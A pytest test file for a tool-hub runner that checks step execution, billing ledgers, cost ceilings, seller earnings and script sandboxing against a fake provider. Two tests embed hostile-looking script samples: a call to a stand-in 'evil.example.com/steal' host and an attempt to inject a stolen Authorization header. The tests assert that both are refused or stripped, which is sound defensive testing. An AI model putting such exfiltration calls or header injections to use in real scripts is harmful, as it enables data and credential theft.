"""The hub runner, JSON road, on the real call path with the fake provider: waves, data flow
between steps, for_each, skip_if_empty, allow_fail, the ceiling, the step cap, the failure
rules, and the four books per step (money, audit, provider hits)."""

from __future__ import annotations

import json

import pytest
from httpx import AsyncClient

from treg.config import get_settings

from test_marketplace_call import EP, EP_MICRO, _balance, _entries, platform_on  # noqa: F401

from .asserts import snapshot
from .provider import FakeProvider

BODY = {"data": {"domain": "figma.com", "id": 7}, "rows": [{"e": "a@x"}, {"e": ""}, {"e": "c@x"}]}


@pytest.fixture
def hub_on(monkeypatch):
    """Through the ENVIRONMENT, like platform_on: that fixture clears the settings cache, and a
    value patched onto the old settings object would vanish with it."""
    monkeypatch.setenv("TREG_HUB_ENABLED", "1")
    get_settings.cache_clear()
    yield
    get_settings.cache_clear()


def _manifest(steps, output, **over):
    m = {"name": "flow", "summary": "A test flow.", "uses": [EP],
         "inputs": {"domain": {"type": "string", "example": "figma.com"},
                    "limit": {"type": "int", "default": 2, "max": 5}},
         "steps": steps, "output": output}
    m.update(over)
    return m


async def _publish(clients: AsyncClient, manifest) -> str:
    r = await clients.post("/hub/tools", json={
        "manifest": manifest, "check": {"inputs": {"domain": "figma.com"}, "fields": list(manifest["output"])},
        "readme": "test"})
    assert r.status_code == 201, r.text
    tool_id = r.json()["tool_id"]
    from sqlalchemy import update
    from treg.infra.db import session_maker
    from treg.models import HubTool
    async with session_maker() as s:                # the check run is phase 4; flip by hand here
        await s.execute(update(HubTool).where(HubTool.tool_id == tool_id).values(status="live"))
        await s.commit()
    return tool_id


FAKE = {"X-Fake-Body": json.dumps(BODY)}


async def test_two_waves_data_flows_and_the_four_books(
    matrix_clients: AsyncClient, fake_provider: FakeProvider, platform_on, hub_on,
):
    tool_id = await _publish(matrix_clients, _manifest(
        steps=[
            {"name": "company", "call": EP, "input": {"aweme_id": "$input.domain"}},
            {"name": "news", "call": EP, "input": {"aweme_id": "news-$input.domain"}},
            {"name": "people", "call": EP, "input": {"aweme_id": "$company.data.domain", "count": "$input.limit"}},
        ],
        output={"name": "$company.data.domain", "n": "$news.rows.length", "people": "$people.data"}))
    before = await snapshot(matrix_clients, fake_provider)
    r = await matrix_clients.post(f"/call/{tool_id}", json={"domain": "figma.com"}, headers=FAKE)
    assert r.status_code == 200, r.text
    body = r.json()
    assert body["output"] == {"name": "figma.com", "n": 3, "people": {"domain": "figma.com", "id": 7}}
    assert body["usage"]["steps"] == 3 and body["usage"]["cost_micro"] == 3 * EP_MICRO
    assert [(e["wave"], e["name"], e["outcome"], e["key"]) for e in body["trace"]] == [
        (0, "company", "ok", "treg"), (0, "news", "ok", "treg"), (1, "people", "ok", "treg")]
    assert r.headers["X-Treg-Cost-Micro"] == str(3 * EP_MICRO)
    assert r.headers["X-Treg-Steps"] == "3" and r.headers["X-Treg-Run-Id"] == r.headers["X-Treg-Call-Id"]
    # the provider book: three hits, and step 3 carried step 1's answer in its query
    hits = fake_provider.hits[before.hit_count:]
    assert len(hits) == 3
    people = [h for h in hits if ("count", "2") in h.query][0]
    assert ("aweme_id", "figma.com") in people.query
    # the money book: three child holds, each reserved and settled; nothing open
    assert await _balance(matrix_clients) - before.balance_micro == -3 * EP_MICRO
    fresh = [e for e in await _entries(matrix_clients) if e["id"] not in before.entry_ids]
    assert sorted(e["kind"] for e in fresh) == ["reserve"] * 3 + ["settle"] * 3
    assert {e["call_id"] for e in fresh} == {f"{body['run_id']}:s0", f"{body['run_id']}:s1", f"{body['run_id']}:s2"}
    org = (await matrix_clients.get("/orgs")).json()[0]["org_id"]
    assert (await matrix_clients.get(f"/orgs/{org}/balance")).json()["holds"] == []
    # the run record
    from sqlalchemy import select
    from treg.infra.db import session_maker
    from treg.models import HubRun
    async with session_maker() as s:
        run = (await s.execute(select(HubRun).where(HubRun.run_id == body["run_id"]))).scalars().one()
    assert run.status == "ok" and run.steps == 3 and run.cost_micro == 3 * EP_MICRO and run.inputs == {"domain": "figma.com", "limit": 2}


async def test_for_each_skip_if_empty_and_the_item_scope(
    matrix_clients: AsyncClient, fake_provider: FakeProvider, platform_on, hub_on,
):
    tool_id = await _publish(matrix_clients, _manifest(
        steps=[
            {"name": "people", "call": EP, "input": {"aweme_id": "$input.domain"}},
            {"name": "verify", "call": EP, "for_each": "$people.rows", "as": "person",
             "skip_if_empty": "$person.e", "input": {"aweme_id": "$person.e"}},
        ],
        output={"verified": "$verify[]", "count": "$verify.length"}))
    before = await snapshot(matrix_clients, fake_provider)
    r = await matrix_clients.post(f"/call/{tool_id}", json={"domain": "figma.com"}, headers=FAKE)
    assert r.status_code == 200, r.text
    body = r.json()
    assert body["usage"]["steps"] == 4                    # 1 + 3 items (a skipped item still counts)
    outcomes = [(e["name"], e.get("item"), e["outcome"]) for e in body["trace"]]
    assert outcomes == [("people", None, "ok"), ("verify", 0, "ok"), ("verify", 1, "skipped"), ("verify", 2, "ok")]
    assert body["output"]["count"] == 3 and body["output"]["verified"][1] is None
    assert len(fake_provider.hits) - before.hit_count == 3     # the skipped item never left
    assert {("aweme_id", "a@x"), ("aweme_id", "c@x")} <= {q for h in fake_provider.hits[before.hit_count:] for q in h.query}
    assert r.headers["X-Treg-Cost-Micro"] == str(3 * EP_MICRO)


async def test_a_failed_step_stops_the_run_and_keeps_the_money_already_spent(
    matrix_clients: AsyncClient, fake_provider: FakeProvider, platform_on, hub_on,
):
    tool_id = await _publish(matrix_clients, _manifest(
        steps=[
            {"name": "first", "call": EP, "input": {"aweme_id": "$input.domain"}},
            {"name": "second", "call": EP, "input": {"aweme_id": "$first.data.domain"}},
            {"name": "third", "call": EP, "input": {"aweme_id": "$second.data.domain"}},
        ],
        output={"x": "$third.data"}))
    before = await snapshot(matrix_clients, fake_provider)
    # every step 500s; per_success ⇒ a 5xx is released, so nothing is kept
    r = await matrix_clients.post(f"/call/{tool_id}", json={"domain": "figma.com"},
                                  headers={**FAKE, "X-Fake-Status": "500"})
    assert r.status_code == 424, r.text
    d = r.json()["detail"]
    assert d["error"] == "hub_step_failed" and d["step"] == "first" and d["status"] == 500
    assert [e["outcome"] for e in d["trace"]] == ["failed"]        # nothing new started
    assert r.headers.get("x-treg-error") == "1"
    assert len(fake_provider.hits) - before.hit_count == 1
    assert await _balance(matrix_clients) == before.balance_micro   # released, not charged


async def test_allow_fail_lets_the_run_go_on(
    matrix_clients: AsyncClient, fake_provider: FakeProvider, platform_on, hub_on,
):
    tool_id = await _publish(matrix_clients, _manifest(
        steps=[
            {"name": "shaky", "call": EP, "input": {"aweme_id": "x"}, "allow_fail": True},
            {"name": "after", "call": EP, "input": {"aweme_id": "$shaky.data.domain"}},
        ],
        output={"got": "$after.data.id", "shaky": "$shaky"}))
    r = await matrix_clients.post(f"/call/{tool_id}", json={"domain": "figma.com"},
                                  headers={**FAKE, "X-Fake-Status": "500"})
    # both 500 here (one fake status for all); the first is allowed, the second is not
    assert r.status_code == 424 and r.json()["detail"]["step"] == "after"
    assert [e["outcome"] for e in r.json()["detail"]["trace"]] == ["failed_allowed", "failed"]


async def test_the_ceiling_stops_the_run_before_the_step_that_would_pass_it(
    matrix_clients: AsyncClient, fake_provider: FakeProvider, platform_on, hub_on,
):
    tool_id = await _publish(matrix_clients, _manifest(
        steps=[{"name": "a", "call": EP, "input": {"aweme_id": "x"}},
               {"name": "b", "call": EP, "input": {"aweme_id": "$a.data.domain"}}],
        output={"x": "$b.data"}))
    before = await snapshot(matrix_clients, fake_provider)
    r = await matrix_clients.post(f"/call/{tool_id}", json={"domain": "figma.com"},
                                  headers={**FAKE, "X-Treg-Run-Max-Cost": "0.0015"})   # room for one step
    assert r.status_code == 402, r.text
    d = r.json()["detail"]
    assert d["error"] == "hub_run_max_cost" and d["step"] == "b" and d["charged_micro"] == EP_MICRO
    assert len(fake_provider.hits) - before.hit_count == 1
    assert await _balance(matrix_clients) - before.balance_micro == -EP_MICRO


async def test_the_step_cap_counts_every_item(
    matrix_clients: AsyncClient, fake_provider: FakeProvider, platform_on, hub_on,
):
    tool_id = await _publish(matrix_clients, _manifest(
        steps=[{"name": "people", "call": EP, "input": {"aweme_id": "x"}},
               {"name": "each", "call": EP, "for_each": "$people.rows", "as": "p", "input": {"aweme_id": "$p.e"}}],
        output={"x": "$each[]"}, limits={"steps": 3}))
    r = await matrix_clients.post(f"/call/{tool_id}", json={"domain": "figma.com"}, headers=FAKE)
    assert r.status_code == 424 and r.json()["detail"]["error"] == "hub_step_cap"


async def test_an_own_tool_step_runs_on_the_makers_key_unmetered(
    matrix_clients: AsyncClient, fake_provider: FakeProvider, platform_on, hub_on,
):
    sid = (await matrix_clients.post("/secrets", json={"name": "sb", "value": "MAKER-SB-KEY"})).json()["id"]
    await matrix_clients.post("/tools", json={"name": "supabase", "base_url": "https://fake-provider.invalid/sb", "secret_id": sid})
    m = _manifest(
        steps=[{"name": "rows", "call": "supabase/rest/v1/leads", "input": {"select": "$input.domain"}}],
        output={"rows": "$rows"}, uses=["supabase"])
    tool_id = await _publish(matrix_clients, m)
    before = await snapshot(matrix_clients, fake_provider)
    r = await matrix_clients.post(f"/call/{tool_id}", json={"domain": "e"}, headers=FAKE)
    assert r.status_code == 200, r.text
    assert r.json()["trace"][0]["key"] == "team" and r.json()["trace"][0]["cost_micro"] == 0
    assert r.headers["X-Treg-Cost-Micro"] == "0"
    hit = fake_provider.hits[-1]
    assert hit.path == "/sb/rest/v1/leads" and ("select", "e") in hit.query
    assert hit.headers["authorization"] == "Bearer MAKER-SB-KEY"
    assert await _balance(matrix_clients) == before.balance_micro


async def test_idempotency_key_covers_the_whole_run(
    matrix_clients: AsyncClient, fake_provider: FakeProvider, platform_on, hub_on,
):
    tool_id = await _publish(matrix_clients, _manifest(
        steps=[{"name": "a", "call": EP, "input": {"aweme_id": "x"}}], output={"x": "$a.data"}))
    h = {**FAKE, "Idempotency-Key": "run-once"}
    hits_before = len(fake_provider.hits)            # the publish's check run already hit once
    r1 = await matrix_clients.post(f"/call/{tool_id}", json={"domain": "figma.com"}, headers=h)
    r2 = await matrix_clients.post(f"/call/{tool_id}", json={"domain": "figma.com"}, headers=h)
    assert r1.status_code == 200 and r2.status_code == 200
    assert r2.headers.get("X-Treg-Idempotent-Replay") == "true"
    assert r2.json()["run_id"] == r1.json()["run_id"]
    assert len(fake_provider.hits) - hits_before == 1


# ---------------------------------------------------------------------------------------------
# The script road on the real call path (phase 3)

SCRIPT = """
export default async function run(ctx) {
  const c = await ctx.call("%s", { query: { aweme_id: ctx.inputs.domain } });
  ctx.log("company status " + c.status);
  const rows = await ctx.call("supabase/rest/v1/leads", { query: { select: c.json.data.domain } });
  return { name: c.json.data.domain, rows: rows.json.rows.length, cost_seen: c.status };
}
""" % EP


async def _publish_script(clients: AsyncClient, script: str, uses, fields) -> str:
    r = await clients.post("/hub/tools", json={
        "manifest": {"name": "scripted", "summary": "A scripted flow.", "uses": uses,
                     "inputs": {"domain": {"type": "string", "example": "figma.com"}},
                     "script": "run.js", "output": {"fields": fields}},
        "script": script,
        "check": {"inputs": {"domain": "figma.com"}, "fields": fields}, "readme": "test"})
    assert r.status_code == 201, r.text
    tool_id = r.json()["tool_id"]
    from sqlalchemy import update
    from treg.infra.db import session_maker
    from treg.models import HubTool
    async with session_maker() as s:
        await s.execute(update(HubTool).where(HubTool.tool_id == tool_id).values(status="live"))
        await s.commit()
    return tool_id


async def test_a_script_runs_a_catalog_call_and_an_own_tool_call(
    matrix_clients: AsyncClient, fake_provider: FakeProvider, platform_on, hub_on,
):
    sid = (await matrix_clients.post("/secrets", json={"name": "sb", "value": "MAKER-SB-KEY"})).json()["id"]
    await matrix_clients.post("/tools", json={"name": "supabase", "base_url": "https://fake-provider.invalid/sb", "secret_id": sid})
    tool_id = await _publish_script(matrix_clients, SCRIPT, [EP, "supabase"], ["name", "rows", "cost_seen"])
    before = await snapshot(matrix_clients, fake_provider)
    r = await matrix_clients.post(f"/call/{tool_id}", json={"domain": "figma.com"}, headers=FAKE)
    assert r.status_code == 200, r.text
    body = r.json()
    assert body["output"] == {"name": "figma.com", "rows": 3, "cost_seen": 200}
    assert body["log"] == ["company status 200"]
    assert body["usage"]["steps"] == 2 and body["usage"]["cost_micro"] == EP_MICRO
    assert [(e["call"], e["key"], e["cost_micro"]) for e in body["trace"]] == [(EP, "treg", EP_MICRO), ("supabase/rest/v1/leads", "team", 0)]
    assert r.headers["X-Treg-Cost-Micro"] == str(EP_MICRO)
    hits = fake_provider.hits[before.hit_count:]
    assert len(hits) == 2
    assert hits[1].path == "/sb/rest/v1/leads" and ("select", "figma.com") in hits[1].query
    assert hits[1].headers["authorization"] == "Bearer MAKER-SB-KEY"
    assert await _balance(matrix_clients) - before.balance_micro == -EP_MICRO


async def test_a_script_call_outside_uses_is_refused_and_the_run_stops(
    matrix_clients: AsyncClient, fake_provider: FakeProvider, platform_on, hub_on,
):
    tool_id = await _publish_script(matrix_clients, """
export default async function run(ctx) {
  await ctx.call("hunter.people.email.find", { query: { domain: "x" } });
  return { ok: true };
}""", [EP], ["ok"])
    before = await snapshot(matrix_clients, fake_provider)
    r = await matrix_clients.post(f"/call/{tool_id}", json={"domain": "figma.com"}, headers=FAKE)
    assert r.status_code == 424, r.text
    d = r.json()["detail"]
    assert d["error"] == "hub_script_failed" and d["kind"] == "refused" and "uses" in d["message"]
    assert len(fake_provider.hits) - before.hit_count == 0
    assert await _balance(matrix_clients) == before.balance_micro


async def test_a_script_missing_a_declared_output_field_is_refused(
    matrix_clients: AsyncClient, fake_provider: FakeProvider, platform_on, hub_on,
):
    tool_id = await _publish_script(matrix_clients,
        "export default async function run(ctx) { return { name: 'x' }; }", [EP], ["name", "rows"])
    r = await matrix_clients.post(f"/call/{tool_id}", json={"domain": "figma.com"}, headers=FAKE)
    assert r.status_code == 424 and r.json()["detail"]["error"] == "hub_output_invalid"
    assert r.json()["detail"]["missing"] == ["rows"]


async def test_a_script_failure_keeps_the_money_of_calls_that_completed(
    matrix_clients: AsyncClient, fake_provider: FakeProvider, platform_on, hub_on,
):
    tool_id = await _publish_script(matrix_clients, """
export default async function run(ctx) {
  await ctx.call("%s", { query: { aweme_id: "x" } });
  throw new Error("after paying");
}""" % EP, [EP], ["ok"])
    before = await snapshot(matrix_clients, fake_provider)
    r = await matrix_clients.post(f"/call/{tool_id}", json={"domain": "figma.com"}, headers=FAKE)
    assert r.status_code == 424
    d = r.json()["detail"]
    assert d["kind"] == "script" and "after paying" in d["message"] and d["charged_micro"] == EP_MICRO
    assert await _balance(matrix_clients) - before.balance_micro == -EP_MICRO


async def test_a_script_header_reaches_the_upstream_but_identity_headers_do_not(
    matrix_clients: AsyncClient, fake_provider: FakeProvider, platform_on, hub_on,
):
    sid = (await matrix_clients.post("/secrets", json={"name": "sb", "value": "MAKER-SB-KEY"})).json()["id"]
    await matrix_clients.post("/tools", json={"name": "supabase", "base_url": "https://fake-provider.invalid/sb", "secret_id": sid})
    tool_id = await _publish_script(matrix_clients, """
export default async function run(ctx) {
  const r = await ctx.call("supabase/rest/v1/keyword_rankings", {
    query: { select: "keyword" },
    headers: { "Accept-Profile": "hubdemo", "Authorization": "Bearer STOLEN", "X-Treg-Token": "nope", "apikey": "x" },
  });
  return { n: r.json.rows.length };
}""", ["supabase"], ["n"])
    r = await matrix_clients.post(f"/call/{tool_id}", json={"domain": "figma.com"}, headers=FAKE)
    assert r.status_code == 200, r.text
    hit = fake_provider.hits[-1]
    assert hit.headers.get("accept-profile") == "hubdemo"
    assert hit.headers["authorization"] == "Bearer MAKER-SB-KEY"      # the tool's binding, never the script's
    assert "x-treg-token" not in hit.headers and hit.headers.get("apikey") != "x"


async def test_a_step_never_accepts_a_compressed_answer(
    matrix_clients: AsyncClient, fake_provider: FakeProvider, platform_on, hub_on,
):
    """The runner reads every step's bytes itself, so a step asks for identity encoding whatever
    the caller sent (live 2026-09-09: a gzip-compressed 20-row answer read as an empty list)."""
    tool_id = await _publish(matrix_clients, _manifest(
        steps=[{"name": "a", "call": EP, "input": {"aweme_id": "x"}}], output={"x": "$a.data"}))
    hits_before = len(fake_provider.hits)
    r = await matrix_clients.post(f"/call/{tool_id}", json={"domain": "figma.com"},
                                  headers={**FAKE, "Accept-Encoding": "gzip, deflate, br"})
    assert r.status_code == 200
    assert fake_provider.hits[hits_before].headers.get("accept-encoding") == "identity"


# ---------------------------------------------------------------------------------------------
# The seller's money (phase 6): the price rides one hold, lands as `earned`, invariant on both teams

async def _invariant(org_id: int) -> None:
    from sqlalchemy import func, select
    from treg.infra.db import session_maker
    from treg.models import CreditBlock, Hold, Org
    async with session_maker() as s:
        bal = (await s.execute(select(Org.balance_micro).where(Org.id == org_id))).scalar_one()
        blocks = (await s.execute(select(func.coalesce(func.sum(CreditBlock.remaining_micro), 0))
                                  .where(CreditBlock.org_id == org_id))).scalar_one()
        holds = (await s.execute(select(func.coalesce(func.sum(Hold.amount_micro), 0))
                                 .where(Hold.org_id == org_id))).scalar_one()
    assert bal == blocks - holds, (bal, blocks, holds)


async def _second_team(clients: AsyncClient, email: str) -> tuple[dict, int]:
    """A stranger with their own token and the $1 welcome credit."""
    token = (await clients.post("/users", json={"email": email})).json()["token"]
    h = {"X-Treg-Token": token}
    org_id = (await clients.get("/orgs", headers=h)).json()[0]["org_id"]
    return h, org_id


async def _balance_of(clients: AsyncClient, h: dict, org_id: int) -> dict:
    return (await clients.get(f"/orgs/{org_id}/balance", headers=h)).json()


async def test_a_paid_run_moves_the_price_to_the_maker_as_earned_credit(
    matrix_clients: AsyncClient, fake_provider: FakeProvider, platform_on, hub_on,
):
    maker_org = (await matrix_clients.get("/orgs")).json()[0]["org_id"]
    tool_id = await _publish(matrix_clients, _manifest(
        steps=[{"name": "a", "call": EP, "input": {"aweme_id": "$input.domain"}}],
        output={"x": "$a.data"}, price_usd=0.01))
    caller_h, caller_org = await _second_team(matrix_clients, "stranger@example.com")
    maker_before = await _balance(matrix_clients)
    caller_before = (await _balance_of(matrix_clients, caller_h, caller_org))["balance_micro"]

    r = await matrix_clients.post(f"/call/{tool_id}", json={"domain": "figma.com"}, headers={**FAKE, **caller_h})
    assert r.status_code == 200, r.text
    u = r.json()["usage"]
    assert u == {**u, "steps_micro": EP_MICRO, "price_micro": 10_000, "cost_micro": EP_MICRO + 10_000}
    assert r.headers["X-Treg-Cost-Micro"] == str(EP_MICRO + 10_000)
    # the caller paid the step and the price; the maker earned the price, whole
    assert (await _balance_of(matrix_clients, caller_h, caller_org))["balance_micro"] == caller_before - EP_MICRO - 10_000
    assert await _balance(matrix_clients) == maker_before + 10_000
    blocks = (await matrix_clients.get(f"/orgs/{maker_org}/balance")).json()["blocks"]
    assert any(b["kind"] == "earned" and b["remaining_micro"] == 10_000 for b in blocks)
    await _invariant(maker_org); await _invariant(caller_org)
    # the ledger tells the story on both sides: settle on the payer names the payee, grant on the payee names the payer
    caller_entries = (await _balance_of(matrix_clients, caller_h, caller_org))["entries"]["items"]
    price_settle = next(e for e in caller_entries if e["call_id"] == f"{r.json()['run_id']}:price" and e["kind"] == "settle")
    assert price_settle["meta"]["payee_org_id"] == maker_org
    maker_entries = (await matrix_clients.get(f"/orgs/{maker_org}/balance")).json()["entries"]["items"]
    grant = next(e for e in maker_entries if e["kind"] == "grant" and e["meta"].get("block_kind") == "earned")
    assert grant["meta"]["payer_org_id"] == caller_org and grant["amount_micro"] == 10_000


async def test_a_failed_run_pays_the_maker_nothing(
    matrix_clients: AsyncClient, fake_provider: FakeProvider, platform_on, hub_on,
):
    tool_id = await _publish(matrix_clients, _manifest(
        steps=[{"name": "a", "call": EP, "input": {"aweme_id": "x"}}], output={"x": "$a.data"}, price_usd=0.05))
    caller_h, caller_org = await _second_team(matrix_clients, "stranger2@example.com")
    maker_before = await _balance(matrix_clients)
    caller_before = (await _balance_of(matrix_clients, caller_h, caller_org))["balance_micro"]
    r = await matrix_clients.post(f"/call/{tool_id}", json={"domain": "x"}, headers={**FAKE, **caller_h, "X-Fake-Status": "500"})
    assert r.status_code == 424 and r.json()["detail"]["price_micro"] == 0
    assert await _balance(matrix_clients) == maker_before                                # nothing earned
    assert (await _balance_of(matrix_clients, caller_h, caller_org))["balance_micro"] == caller_before   # price released, 5xx step released
    assert (await _balance_of(matrix_clients, caller_h, caller_org))["holds"] == []
    await _invariant(caller_org)


async def test_the_maker_never_pays_their_own_price_and_the_check_is_free_of_it(
    matrix_clients: AsyncClient, fake_provider: FakeProvider, platform_on, hub_on,
):
    before = await _balance(matrix_clients)
    tool_id = await _publish(matrix_clients, _manifest(
        steps=[{"name": "a", "call": EP, "input": {"aweme_id": "x"}}], output={"x": "$a.data"}, price_usd=0.10))
    # the publish's check run: only the step was charged, never the 0.10 price
    assert await _balance(matrix_clients) == before - EP_MICRO
    r = await matrix_clients.post(f"/call/{tool_id}", json={"domain": "x"}, headers=FAKE)
    assert r.status_code == 200 and r.json()["usage"]["price_micro"] == 0


async def test_earned_credit_is_spent_before_purchased_money(
    matrix_clients: AsyncClient, fake_provider: FakeProvider, platform_on, hub_on,
):
    from treg.domain import money as ledger
    from treg.infra.db import session_maker
    maker_org = (await matrix_clients.get("/orgs")).json()[0]["org_id"]
    async with session_maker() as s:                     # the maker also holds purchased money
        await ledger.topup(s, maker_org, 500_000, "pi_test_hub_6")
        await s.commit()
    tool_id = await _publish(matrix_clients, _manifest(
        steps=[{"name": "a", "call": EP, "input": {"aweme_id": "x"}}], output={"x": "$a.data"}, price_usd=0.02))
    caller_h, _ = await _second_team(matrix_clients, "stranger3@example.com")
    assert (await matrix_clients.post(f"/call/{tool_id}", json={"domain": "x"}, headers={**FAKE, **caller_h})).status_code == 200
    blocks = {b["kind"]: b["remaining_micro"] for b in (await matrix_clients.get(f"/orgs/{maker_org}/balance")).json()["blocks"]}
    assert blocks["earned"] == 20_000 and blocks["purchased"] == 500_000
    # the maker spends: promotional is gone by now? not necessarily — force the order by draining it
    await matrix_clients.post(f"/call/{tool_id}", json={"domain": "x"}, headers=FAKE)   # one step as the maker
    after = {b["kind"]: b["remaining_micro"] for b in (await matrix_clients.get(f"/orgs/{maker_org}/balance")).json()["blocks"]}
    assert after["purchased"] == 500_000                  # purchased money untouched while earned/promo remain
    assert after["earned"] + after.get("promotional", 0) == blocks["earned"] + blocks.get("promotional", 0) - EP_MICRO


async def test_the_ceiling_counts_the_price(
    matrix_clients: AsyncClient, fake_provider: FakeProvider, platform_on, hub_on,
):
    tool_id = await _publish(matrix_clients, _manifest(
        steps=[{"name": "a", "call": EP, "input": {"aweme_id": "x"}}], output={"x": "$a.data"}, price_usd=0.05))
    caller_h, caller_org = await _second_team(matrix_clients, "stranger4@example.com")
    r = await matrix_clients.post(f"/call/{tool_id}", json={"domain": "x"},
                                  headers={**FAKE, **caller_h, "X-Treg-Run-Max-Cost": "0.05"})   # room for the price, not the step
    assert r.status_code == 402 and r.json()["detail"]["error"] == "hub_run_max_cost"
    assert (await _balance_of(matrix_clients, caller_h, caller_org))["holds"] == []          # the price hold was released


async def test_a_caller_who_cannot_afford_the_price_is_refused_before_any_step(
    matrix_clients: AsyncClient, fake_provider: FakeProvider, platform_on, hub_on,
):
    tool_id = await _publish(matrix_clients, _manifest(
        steps=[{"name": "a", "call": EP, "input": {"aweme_id": "x"}}], output={"x": "$a.data"}, price_usd=5.00))
    caller_h, _ = await _second_team(matrix_clients, "poor@example.com")     # $1 welcome credit only
    hits = len(fake_provider.hits)
    r = await matrix_clients.post(f"/call/{tool_id}", json={"domain": "x"}, headers={**FAKE, **caller_h})
    assert r.status_code == 402 and r.json()["detail"]["price_micro"] == 5_000_000
    assert len(fake_provider.hits) == hits


async def test_the_earnings_report_counts_runs_and_credit_never_callers(
    matrix_clients: AsyncClient, fake_provider: FakeProvider, platform_on, hub_on,
):
    tool_id = await _publish(matrix_clients, _manifest(
        steps=[{"name": "a", "call": EP, "input": {"aweme_id": "x"}}], output={"x": "$a.data"}, price_usd=0.01))
    caller_h, _ = await _second_team(matrix_clients, "stranger5@example.com")
    await matrix_clients.post(f"/call/{tool_id}", json={"domain": "x"}, headers={**FAKE, **caller_h})
    await matrix_clients.post(f"/call/{tool_id}", json={"domain": "x"}, headers={**FAKE, **caller_h, "X-Fake-Status": "500"})
    r = await matrix_clients.get(f"/hub/tools/{tool_id}/earnings")
    assert r.status_code == 200, r.text
    d = r.json()
    assert d["earned_micro"] == 10_000 and d["runs"] == 2
    assert d["by_day"][0] == {**d["by_day"][0], "runs": 2, "ok": 1, "failed": 1, "earned_micro": 10_000}
    assert "stranger" not in r.text
    csv = await matrix_clients.get(f"/hub/tools/{tool_id}/earnings?format=csv")
    assert csv.headers["content-type"].startswith("text/csv") and csv.text.startswith("day,runs,ok,failed,earned_usd")
    # another team cannot read it
    assert (await matrix_clients.get(f"/hub/tools/{tool_id}/earnings", headers=caller_h)).status_code == 404


# ---------------------------------------------------------------------------------------------
# Phase 7.5: the URL target, the public sheet, the uploaded CSV

async def test_a_full_url_under_an_own_tool_in_uses_is_allowed_and_any_other_host_is_refused(
    matrix_clients: AsyncClient, fake_provider: FakeProvider, platform_on, hub_on,
):
    sid = (await matrix_clients.post("/secrets", json={"name": "k", "value": "MY-KEY"})).json()["id"]
    await matrix_clients.post("/tools", json={"name": "my-api", "base_url": "https://fake-provider.invalid/api", "secret_id": sid})
    tool_id = await _publish_script(matrix_clients, """
export default async function run(ctx) {
  const r = await ctx.call("https://fake-provider.invalid/api/v1/things?page=2", { query: { size: "5" } });
  return { path: r.status };
}""", ["my-api"], ["path"])
    r = await matrix_clients.post(f"/call/{tool_id}", json={"domain": "x"}, headers=FAKE)
    assert r.status_code == 200, r.text
    hit = fake_provider.hits[-1]
    assert hit.path == "/api/v1/things" and set(hit.query) >= {("page", "2"), ("size", "5")}
    assert hit.headers["authorization"] == "Bearer MY-KEY"
    # another host, even a real one, is refused and the run stops
    tool2 = await _publish_script(matrix_clients, """
export default async function run(ctx) {
  await ctx.call("https://evil.example.com/steal", {});
  return { path: 1 };
}""", ["my-api"], ["path"])
    r2 = await matrix_clients.post(f"/call/{tool2}", json={"domain": "x"}, headers=FAKE)
    assert r2.status_code == 424 and "not under a tool in `uses`" in r2.json()["detail"]["message"]


async def test_the_public_sheet_recipe_runs_on_a_secretless_tool(
    matrix_clients: AsyncClient, fake_provider: FakeProvider, platform_on, hub_on, monkeypatch,
):
    import json as _json
    from pathlib import Path
    folder = Path(__file__).resolve().parents[2] / "docs" / "hub-recipes" / "data-sheets"
    r = await matrix_clients.post("/tools", json={"name": "sheets", "base_url": "https://fake-provider.invalid"})
    assert r.status_code in (200, 201), r.text          # a public sheet needs no secret
    # the check run is an in-process request under the maker's identity: it carries no X-Fake-*
    # header, so the "sheet" answers from a fixed body for this test
    sheet = b"company,country\nFigma,us\nCanva,au\nNotion,us\n"
    monkeypatch.setattr(FakeProvider, "_response_body", staticmethod(lambda request, headers: sheet))
    manifest = _json.loads((folder / "recipe.json").read_text())
    pub = await matrix_clients.post("/hub/tools", json={
        "manifest": manifest, "script": (folder / "run.js").read_text(),
        "check": _json.loads((folder / "check.json").read_text()), "readme": (folder / "README.md").read_text()})
    assert pub.status_code == 201 and pub.json()["status"] == "live", pub.text
    r = await matrix_clients.post(f"/call/{pub.json()['tool_id']}",
                                  json={"sheet_id": "abc", "column": "country", "equals": "us"})
    assert r.status_code == 200, r.text
    assert r.json()["output"] == {"rows": [{"company": "Figma", "country": "us"}, {"company": "Notion", "country": "us"}], "count": 2}
    hit = fake_provider.hits[-1]
    assert hit.path == "/spreadsheets/d/abc/export" and ("format", "csv") in hit.query and "authorization" not in hit.headers


async def test_the_uploaded_csv_recipe_serves_its_own_data_with_no_call(
    matrix_clients: AsyncClient, fake_provider: FakeProvider, platform_on, hub_on,
):
    import json as _json
    from pathlib import Path
    folder = Path(__file__).resolve().parents[2] / "docs" / "hub-recipes" / "data-csv"
    body = {"manifest": _json.loads((folder / "recipe.json").read_text()), "script": (folder / "run.js").read_text(),
            "check": _json.loads((folder / "check.json").read_text()), "readme": (folder / "README.md").read_text(),
            "data": (folder / "data.csv").read_text()}
    hits = len(fake_provider.hits)
    pub = await matrix_clients.post("/hub/tools", json=body)
    assert pub.status_code == 201 and pub.json()["status"] == "live", pub.text
    tool_id = pub.json()["tool_id"]
    r = await matrix_clients.post(f"/call/{tool_id}", json={"column": "plan", "equals": "enterprise"})
    assert r.status_code == 200, r.text
    assert r.json()["output"]["count"] == 2 and [x["company"] for x in r.json()["output"]["rows"]] == ["Figma", "Supabase"]
    assert r.json()["usage"]["steps"] == 0 and len(fake_provider.hits) == hits      # no call at all
    mine = (await matrix_clients.get("/hub/tools/mine")).json()[0]
    assert mine["data"] == {"rows": 5, "bytes": len((folder / "data.csv").read_text().encode())}
    assert "data uploaded with the tool: 5 rows" in (await matrix_clients.get(f"/hub/{tool_id}")).text
    # a bad CSV is refused by field and rule; a CSV on a steps recipe too
    bad = await matrix_clients.post("/hub/tools", json={**body, "data": "just one line"})
    assert bad.status_code == 422 and bad.json()["detail"]["field"] == "data"
